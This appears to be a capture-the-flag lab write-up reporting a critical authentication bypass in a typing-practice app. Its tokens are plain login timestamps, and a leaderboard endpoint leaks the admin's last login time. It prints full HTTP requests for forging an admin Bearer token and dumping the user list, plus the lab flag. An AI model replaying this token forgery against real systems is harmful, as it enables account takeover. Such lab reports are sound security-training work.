# Bug Report: Broken Authentication via Predictable Timestamp-Based Bearer Token

**Lab:** sokudo-002
**Severity:** Critical
**Flag:** `bug{0SwSR6SeM9MAf7LPkiM3VDpdMdVGPMYs}`

---

## Summary

The Sokudo application issues Bearer tokens that are not JWTs or random values. Instead, each token is simply the server's current timestamp at login/registration time, formatted as `YYYYMMDDHHMMSS`, with no signature or secret involved. The stats leaderboard endpoint, reachable by any authenticated user regardless of privilege, discloses every user's `last_login` field as an ISO timestamp, including the admin account. Reformatting the admin's disclosed `last_login` into the same `YYYYMMDDHHMMSS` shape produces a fully valid admin Bearer token with no brute forcing required.

---

## Steps to Reproduce

1. Register a low-privileged account and inspect the returned token:

```
POST /api/register HTTP/2
Host: lab-1783361394762-01mp1t.labs-app.bugforge.io
Content-Type: application/json

{"username":"claudetest1","email":"claudetest1@test.com","password":"Password123!"}
```

Response:

```json
{"token":"20260706181227","user":{"id":4,"username":"claudetest1","email":"claudetest1@test.com"}}
```

2. Query the leaderboard with this low-privileged token:

```
GET /api/stats/leaderboard HTTP/2
Host: lab-1783361394762-01mp1t.labs-app.bugforge.io
Authorization: Bearer 20260706181227
```

Response includes the caller's own entry with `"last_login": "2026-07-06T18:12:27.078Z"`, matching the issued token exactly and confirming the token equals the login timestamp. It also includes the admin entry:

```json
{
  "username": "admin",
  "best_wpm": null,
  "total_sessions": null,
  "avg_wpm": null,
  "last_login": "2026-07-06T18:09:56.263Z"
}
```

3. Reformat the admin's `last_login` into `YYYYMMDDHHMMSS`: `20260706180956`. Use it directly as a Bearer token:

```
GET /api/verify-token HTTP/2
Host: lab-1783361394762-01mp1t.labs-app.bugforge.io
Authorization: Bearer 20260706180956
```

Response:

```json
{"user":{"id":1,"username":"admin","email":"admin@sokudo.app","full_name":"System Administrator","role":"admin"}}
```

4. Use the forged admin token against the admin endpoint:

```
GET /api/admin/users HTTP/2
Host: lab-1783361394762-01mp1t.labs-app.bugforge.io
Authorization: Bearer 20260706180956
```

Response:

```json
{
  "users": [
    {"id":1,"username":"admin","email":"admin@sokudo.app","full_name":"System Administrator","role":"admin","created_at":"2026-07-06 18:09:56"},
    {"id":2,"username":"speedtyper","email":"speed@example.com","full_name":"Lightning Fast","role":"user","created_at":"2026-07-06 18:09:56"},
    {"id":3,"username":"learner","email":"learner@example.com","full_name":"Practice Makes Perfect","role":"user","created_at":"2026-07-06 18:09:56"},
    {"id":4,"username":"claudetest1","email":"claudetest1@test.com","full_name":"","role":"user","created_at":"2026-07-06 18:12:27"}
  ],
  "flag": "bug{0SwSR6SeM9MAf7LPkiM3VDpdMdVGPMYs}"
}
```

---

## Root Cause

The backend issues authentication tokens by formatting the current server timestamp as `YYYYMMDDHHMMSS` instead of generating a signed or random credential. Because the token space is fully determined by a value with one-second granularity, anyone who learns another user's login timestamp to the second can construct that user's valid token without any cryptographic material. The stats leaderboard endpoint compounds this by exposing `last_login` for every user, including the admin account, to any authenticated caller regardless of role, turning an already weak token scheme into a directly exploitable authentication bypass.

---

## Impact

An attacker who can register any account can immediately read the admin's `last_login` from the leaderboard and forge a fully valid admin token in a single request, with no rate limiting, brute forcing, or timing side channel required. This results in complete authentication bypass and full administrative account takeover, including access to the admin user listing and any other admin-gated functionality.
